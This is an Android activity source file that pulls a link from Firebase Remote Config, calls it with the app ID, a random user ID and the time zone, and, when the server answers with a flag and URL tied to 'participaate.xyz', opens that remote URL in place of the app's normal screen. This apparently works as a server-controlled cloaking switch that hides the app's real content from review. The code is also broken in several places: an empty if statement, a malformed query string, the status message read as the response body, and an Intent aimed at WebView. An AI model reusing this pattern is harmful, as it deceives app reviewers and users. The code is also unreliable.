package com.example;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.analytics.FirebaseAnalytics;

import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebView;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.onesignal.OneSignal;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.TimeZone;
import java.util.UUID;

import javax.net.ssl.HttpsURLConnection;

public class MyInitialActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_myinitialactivity);
//OneSignal
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId("107787ec-7f77-4577-83ce-632b65525355");
//Analytics
        FirebaseAnalytics mFirebaseAnalytics = FirebaseAnalytics.getInstance(this);
//Remote Config
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        mFirebaseRemoteConfig.setDefaults(R.xml.remoteconfig);
        mFirebaseRemoteConfig.fetch().addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull @NotNull Task<Void> task) {
                if(task.isComplete()){
                    String url = mFirebaseRemoteConfig.getString("check_link");
                    if(url==null || url.isEmpty());

                    url+= "/?packageid=" + BuildConfig.APPLICATION_ID
                            + "&usserid=" + UUID.randomUUID().toString()
                            + "&getz=" + TimeZone.getDefault().toString()
                            +"getr=utm_source=google-play&utm_medium=organic";

                    try {
                        URL request = new URL(url);
                        HttpsURLConnection connection = (HttpsURLConnection) request.openConnection();
                        if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                            String response = connection.getResponseMessage();
                            if (response.matches("\\{\\s*([\\s,]*\"flag\"[\\s:]*\"true\"|[\\s,]*\"url\"[\\s:]*\"PRIMER_URL\"|[\\s,]*\"ip\"[\\s:]*\"participaate.xyz\"){3}\\s*\\}")) {
                                String urlFromJson = response.replaceAll("(.|\\s)*?url\"[\\s:]*\"(.*?)\"(.|\\s)*+", "$2");
                                OneSignal.sendTag("Audience", urlFromJson);
                                startActivity(new Intent(MyInitialActivity.this, WebView.class).putExtra("url", urlFromJson));
                            }
                        }
                        if(connection.getResponseCode() == HttpURLConnection.HTTP_FORBIDDEN){
                            startActivity(new Intent(MyInitialActivity.this, MainActivity.class));
                        }
                    } catch (MalformedURLException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }else{

                }

            }
        });

    }
}